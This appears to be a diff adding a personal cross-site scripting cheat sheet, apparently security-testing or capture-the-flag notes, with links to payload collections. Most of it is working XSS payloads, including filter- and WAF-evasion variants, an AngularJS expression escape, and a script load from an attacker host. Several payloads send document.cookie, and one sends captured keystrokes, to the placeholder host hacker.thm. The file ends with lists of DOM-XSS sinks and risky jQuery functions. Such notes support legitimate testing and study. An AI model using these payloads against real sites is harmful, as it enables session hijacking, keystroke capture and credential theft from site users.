@@ -1,0 +1,72 @@
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+https://ocholuo.github.io/posts/XSS-Filter-Evasion-Cheat-Sheet/
+
+#Identify XSS endpoint
+<script>alert(document.domain);</script>
+<script>alert("xss")</script>
+<img src=1 onerror=alert(document.domain)>
+<><img src=1 onerror=alert(document.domain)>
+\"-alert(document.domain)}//
+'-alert(document.domain)-'
+”><svg onload=alert(document.domain)>
+"><script>alert(document.domain)</script>
+<script>alert(document.domain.concat("\n").concat(window.origin))</script>
+"onmouseover="alert(document.domain) #for when angle brackets are HTML-encoded
+
+#load script from attacker machine
+<script src=//HOST/SCRIPT></script>
+<svg onload=fetch('//HOST/?cookie='+document.cookie)>
+
+
+#Embed image
+<img src="https://www.bugcrowd.com/wp-content/uploads/2019/04/bugcrowd-logo.svg">
+(originally: http://localhost:8000/?name=%3Cimg%20src=%22https://www.bugcrowd.com/wp-content/uploads/2019/04/bugcrowd-logo.svg%22%3E)
+	#one must insert the URL encoded HTML payload into the database function, which in this case is looking up the name of a user
+
+
+
+AnguluarJS (ng-app) #https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression:
+{{$on.constructor('alert(1)')()}}
+
+WAF -- when you need to throw a function to the global exception handler:
+onerror=alert;throw 1
+
+JavaScript template literals:
+${alert(document.domain)}
+
+#Cookie stealing: base64 encodes, sends to attackers server 
+<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+
+#key logger
+<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
+
+Sinks that can lead to DOM-XSS vulnerabilities:
+document.write()
+document.writeln()
+document.domain
+element.innerHTML
+element.outerHTML
+element.insertAdjacentHTML
+element.onevent
+
+jQuery functions that can lead to DOM-XSS:
+add()
+after()
+append()
+animate()
+insertAfter()
+insertBefore()
+before()
+html()
+prepend()
+replaceAll()
+replaceWith()
+wrap()
+wrapInner()
+wrapAll()
+has()
+constructor()
+init()
+index()
+jQuery.parseHTML()
+$.parseHTML()
